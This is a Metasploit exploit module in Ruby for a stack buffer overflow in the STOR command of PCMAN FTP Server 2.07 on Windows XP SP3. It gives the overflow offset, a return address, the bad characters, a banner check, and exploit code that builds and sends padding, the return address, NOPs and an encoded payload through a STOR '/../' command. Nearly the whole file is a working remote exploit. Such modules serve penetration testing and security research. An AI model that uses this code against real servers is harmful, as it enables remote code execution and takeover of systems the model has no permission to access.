##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require \'msf/core\'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::Ftp
	
	def initialize(info = {})
		super(update_info(info,
			\'Name\'           => \'PCMAN FTP Server STOR Command Stack Overflow\',
			\'Description\'    => %q{
						This module exploits a buffer overflow vulnerability
						found in the STOR command of the PCMAN FTP v2.07 Server
						when the \"/../\" parameters are also sent to the server.
			},
			\'Author\'         => [
						\'Christian (Polunchis) Ramirez\',	# Initial Discovery
						\'Rick (nanotechz9l) Flores\',		# Metasploit Module                             
					],
			\'License\'        => MSF_LICENSE,
			\'Version\'        => \'$Revision: $\',
			\'References\'     =>
				[
					[ \'URL\', \'http://www.exploit-db.com/exploits/27703/\' ],
				],
			\'DefaultOptions\' =>
				{
					\'EXITFUNC\' => \'process\',
				},
			\'Payload\'        =>
				{
					\'Space\' 		=> 1000,
					\'BadChars\' 		=> \"\\x00\\xff\\x0a\\x0d\\x20\\x40\",
				},
			\'Platform\'       => \'win\',
			\'Targets\'        =>
				[
					[ \'Windows XP SP3\', 
						{ 
							\'Ret\' => 0x7C91FCD8, # jmp esp from kernel32.dll
							\'Offset\' => 2002
						} 
					],
				],
			\'DisclosureDate\' => \'Jul 17 2011\',
			\'DefaultTarget\'	=> 0))
	end
	
	def check
	connect
	disconnect
	if (banner =~ /220 PCMan\'s FTP Server 2.0/)
		return Exploit::CheckCode::Vulnerable
		end
		return Exploit::CheckCode::Safe
	end

	def exploit
		connect_login
		print_status(\"Trying victim #{target.name}...\")		
		sploit = \"\\x41\" * 2002 + [target.ret].pack(\'V\') + make_nops(4) + \"\\x83\\xc4\\x9c\" + payload.encoded
		sploit << make_nops(4)
		sploit << payload.encoded
		send_cmd( [\'STOR\', \'/../\' + sploit], false )
		handler
		disconnect
	end
end